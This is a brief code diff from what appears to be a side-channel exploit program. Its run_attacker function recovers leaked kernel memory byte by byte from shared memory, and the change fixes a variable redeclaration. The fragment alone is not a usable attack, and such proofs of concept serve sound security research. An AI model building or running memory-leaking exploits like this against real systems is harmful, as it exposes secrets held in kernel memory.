@@ -87,7 +87,7 @@ int run_attacker(int kernel_fd, char *shared_memory) {
             }
         }
 
-        char leaked_byte = best_guess;
+        leaked_byte = best_guess;
 
         leaked_str[current_offset] = leaked_byte;
         if (leaked_byte == '\x00') {
